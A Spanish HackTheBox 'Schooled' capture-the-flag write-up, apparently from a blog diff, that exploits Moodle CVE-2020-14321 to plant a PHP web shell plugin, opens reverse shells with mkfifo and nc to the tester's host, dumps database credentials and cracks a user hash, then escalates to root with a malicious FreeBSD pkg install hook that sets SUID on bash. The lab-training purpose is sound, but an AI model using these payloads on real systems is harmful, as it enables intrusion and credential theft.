+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335google_cve_moodle.png" alt="335google_cve_moodle" /></p>
+
+<p>La vulnerabilidad se basa en que un <strong>profesor</strong> puede asignarse a sí mismo o a otros el rol de <strong>manager</strong> dentro de un curso, <u>lo que le daría poder de manipular el curso como **administrador**</u> 😮</p>
+
+<p>Entonces, si indagamos un poco encontramos el <a href="https://github.com/HoangKien1020/CVE-2020-14321">PoC oficial</a> de la persona que encontró la vulnerabilidad:</p>
+
+<ul>
+  <li><strong>Kien Hoang</strong> - <a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a>.</li>
+</ul>
+
+<p>Ya tenemos todo lo que necesitamos, así que sigamos los mismos pasos que el video:</p>
+
+<p><span style="color: yellow;"><u>1.</u> </span>Nos logeamos como profesor, pero como tenemos la cookie de uno, tamos bien.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_changeCookie.png" alt="335page80_moodle_changeCookie" /></p>
+
+<p><span style="color: yellow;">2. </span>Vamos al curso del cual somos profesor, en nuestro caso <strong>mathematics (Maths)</strong>, damos clic en <strong>Participants</strong> y después en <strong>Enrol users</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_stepsToEnrol.png" alt="335page80_moodle_cve_stepsToEnrol" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_enrolUsers.png" alt="335page80_moodle_cve_enrolUsers" /></p>
+
+<p>Estando en esa ventana seleccionamos al usuario <code>Lianne Carter</code> para enrolarla al curso (ya jugaremos con burp), pero, ¿por qué ella? Bueno si recordamos cuando encontramos los profesores en la web, estaba <strong>Lianne Carter</strong> como <u>manager del sitio</u>, así que nos aprovecharemos para cambiar unos valores y enrolarla, pero como administradora del curso (si no, se enrolaría como estudiante :P).</p>
+
+<p>Interceptamos mediante <strong>BurpSuite</strong> la petición y damos clic en <strong>Enrol users</strong>, obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335burp_moodle_cve_enrolUser_lianne.png" alt="335burp_moodle_cve_enrolUser_lianne" /></p>
+
+<p>Dos campos importantes:</p>
+
+<ul>
+  <li><code>userlist[]=</code> (ID del usuario).</li>
+  <li><code>roletoassign=</code> (Rol a asignar, <strong>1 es manager</strong> según <a href="https://docs.moodle.org/all/es/Gestionar_roles">esta documentación</a>).</li>
+</ul>
+
+<hr />
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335google_moodle_roles.png" alt="335google_moodle_roles" /></p>
+
+<p>Así que en vez de <code>5</code> colocamos <code>1</code> y enviamos la petición.</p>
+
+<p>Pero validando en la web no vemos que <strong>Lianne</strong> sea <strong>manager</strong> aún:</p>
+
+<pre><code class="language-html">Lianne Carter - carter_lianne@staff.schooled.htb - Student
+</code></pre>
+
+<p>Si modificamos al usuario <strong>Manuel (ID 24)</strong> (con el que estamos) para que también tenga el rol de <strong>manager</strong> obtenemos en la web:</p>
+
+<pre><code class="language-html">Lianne Carter - carter_lianne@staff.schooled.htb - Manager, Student
+...
+Manuel Phillips - phillips_manuel@staff.schooled.htb - Manager, Teacher
+</code></pre>
+
+<p>Listos, ahora si podemos seguir con el <strong>PoC</strong>…</p>
+
+<p><span style="color: yellow;">3. </span>Obtenemos una sesión en <em>Moodle</em> como <strong>Lianne</strong> (manager) en el curso.</p>
+
+<p>Damos clic en el nombre de <strong>Lianne</strong> y estando en su perfil vamos a <code>Log in as</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_logIN.png" alt="335page80_moodle_cve_lianne_logIN" /></p>
+
+<p>Y ahora somos <strong>Lianne</strong> y tenemos acceso a un nuevo apartado, <code>Site administration</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_siteAdmin.png" alt="335page80_moodle_cve_lianne_siteAdmin" /></p>
+
+<p><span style="color: yellow;">4. </span>Vamos a instalar un <strong>plugin</strong> malicioso.</p>
+
+<p>Entramos al sitio administrativo y seleccionamos <code>Plugins</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_plugins.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora damos clic en <code>Install plugins</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_installPlugin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nos pide un archivo <code>zip</code> para instalar el plugin. Volviendo al repo vemos que nos provee con un comprimido llamado <code>rce.zip</code>:</p>
+
+<ul>
+  <li><a href="https://github.com/HoangKien1020/Moodle_RCE/blob/master/rce.zip">https://github.com/HoangKien1020/Moodle_RCE/blob/master/rce.zip</a>.</li>
+</ul>
+
+<p>Lo descargamos y validando su contenido tenemos:</p>
+
+<pre><code class="language-bash">❭ tree rce
+rce
+├── lang
+│   └── en
+│       └── block_rce.php
+└── version.php
+</code></pre>
+
+<p>🔦 <code>block_rce.php</code> es el archivo que nos permite ejecutar comandos en el sistema, todo mediante la variable <code>cmd</code> que recibe en la petición <code>GET</code>:</p>
+
+<pre><code class="language-php">❭ cat rce/lang/en/block_rce.php 
+&lt;?php system($_GET['cmd']); ?&gt;
+</code></pre>
+
+<p>🔦 <code>version.php</code> permite la generación del plugin y llama a nuestro archivo malicioso:</p>
+
+<pre><code class="language-php">❭ cat rce/version.php 
+&lt;?php 
+$plugin-&gt;version = 2020061700;
+$plugin-&gt;component = 'block_rce';
+</code></pre>
+
+<p>Listos, para subir el archivo <code>zip</code>, seleccionamos el objeto y damos clic en <strong><u>Install plugin from the ZIP file</u></strong>, recibimos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_installPluginFromZIP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Damos clic en <strong><u>Continue</u></strong> y según las indicaciones del <strong>PoC</strong> simplemente debemos dirigirnos a la siguiente ruta:</p>
+
+<pre><code class="language-bash">&lt;domain&gt;/blocks/rce/lang/en/block_rce.php
+</code></pre>
+
+<p>Y concatenarle el comando que queramos ejecutar con la variable <code>cmd</code>, modificándola quedaría así para ejecutar el comando <code>id</code>:</p>
+
+<pre><code class="language-html">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_pluginInstalled_RCE.png" alt="335page80_moodle_cve_lianne_pluginInstalled_RCE" /></p>
+
+<p>PERFECTOOOOOOOOOOOOOOOOOOOOOOo tenemos ejecución remota de comandossadflakjwlekfjlkasd (: Intentemos conseguir una reverse Shell…</p>
+
+<p>Nos ponemos en escucha con <strong>netcat</strong>: <code>nc -lvp 4433</code>.</p>
+
+<ul>
+  <li><a href="https://sentrywhale.com/documentation/reverse-shell">Reverse Shells Others and <strong>FreeBSD</strong></a>.</li>
+</ul>
+
+<p>Probando estas dos sentencias lo logramos:</p>
+
+<pre><code class="language-html">http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.11 4433 &gt; /tmp/f
+http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.11 4433 &gt; /tmp/f
+</code></pre>
+
+<p>Y Listones, ya estariamos dentro. Intentando hacer tratamiento de la <code>TTY</code> o al menos tener una Shell más bonita, tenemos problemas y no lo logramos :( Así que enumeremos a ver como podemos movernos a algo lindo.</p>
+
+<p>…</p>
+
+<p>Como vimos, el proceso es muuuuy largo y tedioso de hacer manual, por lo tanto me cree dos scripts, uno enfocado 100% en la máquina, con él nos agrega la línea en el perfil de <strong>Moodle</strong> y también toooooooooooodo el tema del <strong>RCE</strong>.</p>
+
+<ul>
+  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/schooled/moodle_schooled_RCE.py">moodle_schooled_RCE.py</a></li>
+</ul>
+
+<p>El otro explota directamente el <strong>CVE</strong>, por lo que funciona contra cualquier <code>Moodle 3.9</code> con el que tengas credenciales de un profesor (o una cookie :P)</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/50180">exploit.db - <strong>Moodle 3.9</strong> Remote Code Execution (RCE) (Authenticated)</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h1 id="movimiento-lateral-jamie"><u>MySQL</u>: www -&gt; jamie <a href="#movimiento-lateral-jamie">#</a></h1>
+
+<p>Enumerando los usuarios del sistema tenemos:</p>
+
+<pre><code class="language-bash">ls -la /home
+lrwxr-xr-x  1 root  wheel  8 Feb 26 22:45 /home -&gt; usr/home
+ls -la /usr/home
+total 26
+drwxr-xr-x   4 root   wheel   4 Mar 16 06:33 .
+drwxr-xr-x  16 root   wheel  16 Feb 26 22:46 ..
+drwx------   2 jamie  jamie  11 Feb 28 18:13 jamie
+drwx------   5 steve  steve  14 Mar 17 14:05 steve
+</code></pre>
+
+<ul>
+  <li><strong>jamie</strong> y <strong>steve</strong>.</li>
+</ul>
+
+<p>Leyendo archivos de la ruta donde salimos encontramos la configuración de la base de datos:</p>
+
+<pre><code class="language-bash">pwd
+/usr/local/www/apache24/data/moodle
+cat config.php
+</code></pre>
+
+<pre><code class="language-php">&lt;?php  // Moodle configuration file
+
+unset($CFG);
+global $CFG;
+$CFG = new stdClass();
+
+$CFG-&gt;dbtype    = 'mysqli';
+$CFG-&gt;dblibrary = 'native';
+$CFG-&gt;dbhost    = 'localhost';
+$CFG-&gt;dbname    = 'moodle';
+$CFG-&gt;dbuser    = 'moodle';
+$CFG-&gt;dbpass    = 'PlaybookMaster2020';
+$CFG-&gt;prefix    = 'mdl_';
+$CFG-&gt;dboptions = array (
+  'dbpersist' =&gt; 0,
+  'dbport' =&gt; 3306,
+  'dbsocket' =&gt; '',
+  'dbcollation' =&gt; 'utf8_unicode_ci',
+);
+
+$CFG-&gt;wwwroot   = 'http://moodle.schooled.htb/moodle';
+$CFG-&gt;dataroot  = '/usr/local/www/apache24/moodledata';
+$CFG-&gt;admin     = 'admin';
+
+$CFG-&gt;directorypermissions = 0777;
+
+require_once(__DIR__ . '/lib/setup.php');
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+</code></pre>
+
+<ul>
+  <li><strong>moodle</strong> -&gt; <strong>PlaybookMaster2020</strong></li>
+</ul>
+
+<p>Buscando la manera de jugar con <code>MySQL</code> con esta terminal encontramos las lindas herramientas:</p>
+
+<pre><code class="language-bash">find / -name mysqlshow
+/usr/local/bin/mysqlshow
+</code></pre>
+
+<p>Usémosla para intentar ver el contenido de la base de datos:</p>
+
+<pre><code class="language-bash">/usr/local/bin/mysqlshow -u moodle -pPlaybookMaster2020
++--------------------+
+|     Databases      |
++--------------------+
+| information_schema |
+| moodle             |
++--------------------+
+</code></pre>
+
+<p>Tenemos la base de datos <code>moodle</code> (aunque ya lo sabíamos del archivo <code>config.php</code>), veamos sus tablas:</p>
+
+<pre><code class="language-bash">/usr/local/bin/mysqlshow -u moodle -pPlaybookMaster2020 moodle
+Database: moodle
++----------------------------------+
+|              Tables              |
++----------------------------------+
+| mdl_analytics_indicator_calc     |
+| mdl_analytics_models             |
+...
+| mdl_user                         |
+...
+</code></pre>
+
+<p>Ahora que tenemos una tabla llamativa podemos usar <code>mysqldump</code> para “dumpear” (realmente hace como si quisiéramos realizar un backup, por eso dumpea) la info de lo que le pidamos, en este caso de la tabla <code>mdl_user</code>:</p>
+
+<pre><code class="language-bash">/usr/local/bin/mysqldump -u moodle -pPlaybookMaster2020 moodle mdl_user
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335bash_wwwRS_mysqldump_MDLuserTable.png" alt="335bash_wwwRS_mysqldump_MDLuserTable" /></p>
+
+<p>Vemos muuuucha información, pero toda es relacionada con usuarios, si ajustamos la visión vemos un usuario llamado <code>jamie</code> y que esta relacionado con el <strong>staff</strong>, por lo que puede ser el mismo <strong>jamie</strong> del sistema, podemos tomar su <strong>hash</strong> e intentar crackearlo.</p>
+
+<pre><code class="language-bash">❭ cat jamie_hash
+$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
+</code></pre>
+
+<p>Usaremos <code>John The Ripper</code>:</p>
+
+<pre><code class="language-bash">❭ john --wordlist=/usr/share/wordlists/rockyou.txt jamie_hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!QAZ2wsx         (?)
+1g 0:00:06:00 DONE (2021-04-12 25:25) 0.002771g/s 38.50p/s 38.50c/s 38.50C/s 010188..!QAZ2wsx
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Al parecer el resultado es <code>!QAZ2wsx</code>, probemos mediante <strong>SSH</strong> con el usuario <strong>jamie</strong>:</p>
+
+<pre><code class="language-bash">❭ ssh jamie@10.10.10.234
+Password for jamie@Schooled:
+Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
+FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021
+
+Welcome to FreeBSD!
+...
+jamie@Schooled:~ $ id
+uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
+jamie@Schooled:~ $ 
+</code></pre>
+
+<p>Perfectísimo, tamos dentro de la máquina con una linda Shell :)</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>Viendo los permisos que tiene <code>jamie</code> en el sistema, tenemos:</p>
+
+<pre><code class="language-bash">jamie@Schooled:~ $ sudo -l
+User jamie may run the following commands on Schooled:
+    (ALL) NOPASSWD: /usr/sbin/pkg update
+    (ALL) NOPASSWD: /usr/sbin/pkg install *
+</code></pre>
+
+<p>Opa, interesante, dos permisos, uno para actualizar paquetes (supongo) y otro para instalar paquetes de la ruta donde estemos. Y ambos los podemos ejecutar como cualquier usuario del sistema.</p>
+
+<ul>
+  <li><a href="https://www.freebsd.org/cgi/man.cgi?query=pkg&amp;sektion=&amp;n=1">INFO <strong>pkg</strong> binary</a>.</li>
+</ul>
+
+<p>📦 <strong><em><u>pkg</u> provides an interface for manipulating packages: registering, adding, removing and upgrading packages.</em></strong></p>
+
+<p>Dando vueltas para ver como podríamos explotar esto, encontramos un post donde nos muestra un script que genera un paquete para posteriormente ser instalado:</p>
+
+<ul>
+  <li><a href="http://lastsummer.de/creating-custom-packages-on-freebsd/">Creating Custom Packages on <strong>FreeBSD</strong></a>.</li>
+</ul>
+
+<p>El post toma el script por partes, pero la parte que nos interesa en la inicial, ya que es donde podemos modificar el código que queremos que se ejecute mientras el paquete se esta instalando:</p>
+
+<pre><code class="language-bash">#!/bin/sh
+
+STAGEDIR=/tmp/stage
+rm -rf ${STAGEDIR}
+mkdir -p ${STAGEDIR}
+
+cat &gt;&gt; ${STAGEDIR}/+PRE_DEINSTALL &lt;&lt;EOF
+# careful here, this may clobber your system
+echo "Resetting root shell"
+pw usermod -n root -s /bin/csh
+EOF
+
+cat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF
+# careful here, this may clobber your system
+echo "Registering root shell"
+pw usermod -n root -s /bin/sh
+EOF
+</code></pre>
+
+<p>Donde relativamente parece que resetea la Shell asignada al usuario <strong>root</strong>, peroooo, podríamos cambiar esos comandos por los nuestros, algo así:</p>
+
+<pre><code class="language-bash">#!/bin/sh
+
+STAGEDIR=/tmp/stage
+rm -rf ${STAGEDIR}
+mkdir -p ${STAGEDIR}
+
+cat &gt;&gt; ${STAGEDIR}/+PRE_DEINSTALL &lt;&lt;EOF
+# careful here, this may clobber your system
+echo "1 root shell"
+whoami | nc 10.10.14.11 4434
+EOF
+
+cat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF
+# careful here, this may clobber your system
+echo "2 root shell"
+id | nc 10.10.14.11 4434
+EOF
+</code></pre>
+
+<p>Intentamos que nos envíe el output de <code>whoami</code> y de <code>id</code> a nuestro listener y ver que obtenemos.</p>
+
+<p>Esta parte es genérica y estructural, entiendo que es necesaria para la creación del paquete, pero no necesitamos modificar nada:</p>
+
+<pre><code class="language-bash">cat &gt;&gt; ${STAGEDIR}/+MANIFEST &lt;&lt;EOF
+name: mypackage
+version: "1.0_5"
+origin: sysutils/mypackage
+comment: "automates stuff"
+desc: "automates tasks which can also be undone later"
+maintainer: john@doe.it
+www: https://doe.it
+prefix: /
+EOF
+
+echo "deps: {" &gt;&gt; ${STAGEDIR}/+MANIFEST
+pkg query "  %n: { version: \"%v\", origin: %o }" portlint &gt;&gt; ${STAGEDIR}/+MANIFEST
+pkg query "  %n: { version: \"%v\", origin: %o }" poudriere &gt;&gt; ${STAGEDIR}/+MANIFEST
+echo "}" &gt;&gt; ${STAGEDIR}/+MANIFEST
+
+mkdir -p ${STAGEDIR}/usr/local/etc
+echo "# hello world" &gt; ${STAGEDIR}/usr/local/etc/my.conf
+echo "/usr/local/etc/my.conf" &gt; ${STAGEDIR}/plist
+
+pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
+</code></pre>
+
+<p>Ahora ya podemos ejecutar el script y validar si se nos genera el paquete:</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ ./aja.sh
+jamie@Schooled:/tmp/aver $ ls
+aja.sh mypackage-1.0_5.txz
+</code></pre>
+
+<p>Listo, se genera correctamente (: Instalémoslo:</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install *.txz
+Updating FreeBSD repository catalogue...
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+</code></pre>
+
+<p>Pero acá se queda pensando y no hace nada, así que buscando encontramos que probablemente el tema sea que intenta actualizar el catálogo de repositorios (como dice ahí) y por eso se queda pegado. Pero en este manual tenemos el parámetro <code>--no-repo-update</code> el cual se encarga precisamente de suprimir la actualización automática que intenta hacer:</p>
+
+<ul>
+  <li><a href="https://man.dragonflybsd.org/?command=pkg-install&amp;section=8"><strong>pkg install</strong> - Install packages from remote package repositories or local archives</a>.</li>
+</ul>
+
+<p>Si volvemos a intentar pero ahora con el nuevo argumento:</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install --no-repo-update *.txz
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+pkg: Repository FreeBSD cannot be opened. 'pkg update' required
+Checking integrity... done (0 conflicting)
+The following 1 package(s) will be affected (of 0 checked):
+
+New packages to be INSTALLED:
+        mypackage: 1.0_5
+
+Number of packages to be installed: 1
+
+Proceed with this action? [y/N]: y
+[1/1] Installing mypackage-1.0_5...
+Extracting mypackage-1.0_5: 100%
+2 root shell
+jamie@Schooled:/tmp/aver $ 
+</code></pre>
+
+<p>Perfecto, se ejecuta, en nuestro listener recibimos:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4434
+listening on [any] 4434 ...
+connect to [10.10.14.11] from schooled.htb [10.10.10.234] 39175
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+</code></pre>
+
+<p>Oko, tenemos ejecución de comandos, pero recibimos el id, por lo tanto el primer apartado parece que no se está ejecutando, agreguemos nuestra reverse Shell en la parte de <strong>+POST_INSTALL</strong> (segundo apartado):</p>
+
+<pre><code class="language-bash">...
+EOF
+
+cat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF
+# careful here, this may clobber your system
+echo "2 root shell"
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i | nc 10.10.14.11 4434 &gt; /tmp/f
+EOF
+
+cat &gt;&gt; ${STAGEDIR}/+MANIFEST &lt;&lt;EOF
+...
+</code></pre>
+
+<p>Pero al ejecutar la instalación del paquete obtenemos o errores o simplemente nada.</p>
+
+<p>Así que podemos probar a modificar la <code>/bin/bash</code> a <strong>SUID</strong>:</p>
+
+<p>⛹️ <strong><u>SUID?</u></strong> <strong><em>… it’s a way in UNIX-like operating systems of <u>running a command as another user without providing credentials</u>.</em></strong> <a href="https://www.pentestpartners.com/security-blog/exploiting-suid-executables/">pentestpartners - exploiting-suid-executables</a>.</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ ls -la /bin/bash
+lrwxr-xr-x  1 root  wheel  19 Apr  1 17:02 /bin/bash -&gt; /usr/local/bin/bash
+</code></pre>
+
+<p>Vemos que <code>/bin/bash</code> tiene un link hacia <code>/usr/local/bin/bash</code>, o sea que cuando ejecutemos <code>/bin/bash</code>, esteremos ejecutando realmente <code>/usr/local/bin/bash</code>.</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ ls -la /usr/local/bin/bash
+-rwxr-xr-x  1 root  wheel  941288 Feb 20 01:47 /usr/local/bin/bash
+</code></pre>
+
+<p>Entonces modificamos los permisos agregándole el <strong>SUID</strong> (<code>4</code>) al binario <code>/bin/bash</code>, que realmente se los estaría otorgando al binario <code>/usr/local/bin/bash</code> :)</p>
+
+<pre><code class="language-bash">...
+EOF
+
+cat &gt;&gt; ${STAGEDIR}/+POST_INSTALL &lt;&lt;EOF
+# careful here, this may clobber your system
+echo "2 root shell"
+chmod 4755 /bin/bash
+EOF
+
+cat &gt;&gt; ${STAGEDIR}/+MANIFEST &lt;&lt;EOF
+...
+</code></pre>
+
+<p>Generamos paquete e instalamos:</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ ./aja.sh 
+jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install --no-repo-update *.txz
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+pkg: Repository FreeBSD cannot be opened. 'pkg update' required
+Checking integrity... done (0 conflicting)
+The following 1 package(s) will be affected (of 0 checked):
+
+New packages to be INSTALLED:
+        mypackage: 1.0_5
+
+Number of packages to be installed: 1
+
+Proceed with this action? [y/N]: y
+[1/1] Installing mypackage-1.0_5...
+Extracting mypackage-1.0_5: 100%
+2 root shell
+jamie@Schooled:/tmp/aver $ 
+</code></pre>
+
+<p>Ahora validamos los permisos de los binarios:</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ ls -la /bin/bash
+lrwxr-xr-x  1 root  wheel  19 Apr  1 17:02 /bin/bash -&gt; /usr/local/bin/bash
+jamie@Schooled:/tmp/aver $ ls -la /usr/local/bin/bash
+-rwsr-xr-x  1 root  wheel  941288 Feb 20 01:47 /usr/local/bin/bash
+</code></pre>
+
+<p>Perfecto, vemos el nuevo permiso asignado con una <code>s</code> en la ejecución.</p>
+
+<p>Ahora simplemente indicamos <code>/usr/local/bin/bash -p</code> para que ejecute el programa con los permisos <strong>SUID</strong> que tenga asignados el objeto. Como el dueño del binario es <code>root</code>, tomara el <strong>SUID de ese usuario</strong>, por lo tanto tendremos una Shell como él.</p>
+
+<pre><code class="language-bash">jamie@Schooled:/tmp/aver $ /usr/local/bin/bash -p
+[jamie@Schooled /tmp/aver]# whoami
+root
+</code></pre>
+
+<p>Y si (: tenemos una sesión como <strong>root</strong>, solo nos quedaría ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335flags.png" alt="335flags" /></p>
+
+<p>…</p>
+
+<p>Linda máquina eh! Linda linda, me gusto mucho como le robamos la cookie al profesor y como nos aprovechamos del rol <strong>manager</strong> para conseguir <strong>RCE</strong>, muy lindo todo.</p>
+
+<p>(Además que me permitió explorar a profundidad la creación de un exploit bastante <strong>retador</strong>)</p>
+
+<p>Y bueno, como siempre y como nunca, muchísimas gracias y a seguir rompiendo todo ;)</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Schooled&url=http://localhost:4000/htb/schooled" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#CSRF">CSRF</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#FreeBSD">FreeBSD</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SUID">SUID</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cookie-hijacking">cookie-hijacking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#moodle">moodle</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#pkg">pkg</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/sink">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png" alt="HackTheBox - Sink"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/sink">HackTheBox - Sink</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios aún más locos, veremos commits relacionados a pasos a producción y pruebas extrañas con...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">18 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
